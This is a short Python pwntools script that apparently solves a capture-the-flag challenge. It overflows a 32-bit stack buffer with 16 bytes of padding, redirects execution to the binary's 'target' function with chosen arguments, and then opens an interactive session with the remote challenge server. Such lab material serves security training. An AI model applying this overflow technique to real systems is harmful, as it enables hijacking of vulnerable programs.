#!/usr/bin/python3
from pwn import *

def exploit():
    # Load the binary file
    elf = context.binary = ELF("chall")

    # Establish the remote connection
    connection = create_connection()

    # Create payload
    payload = create_payload(elf)

    # Send the payload
    connection.sendline(payload)

    # Begin interactive session
    connection.interactive()

def create_connection():
    # Establish the remote connection
    connection = remote("ctf99.cs.ui.ac.id", 10015)
    return connection

def create_payload(elf):
    # Buffer overflow bytes
    overflow = b"A" * 16

    # Function to call
    target_func = p32(elf.sym.target)

    # Argument to the function
    arg1 = p32(0x12345678)

    # Create payload
    payload = (
        overflow
        + target_func # function to call
        + target_func # return address (next function call)
        + arg1        # arg1
        + arg1        # arg2 (arg1 of next call)
    )
    return payload

if __name__ == "__main__":
    exploit()
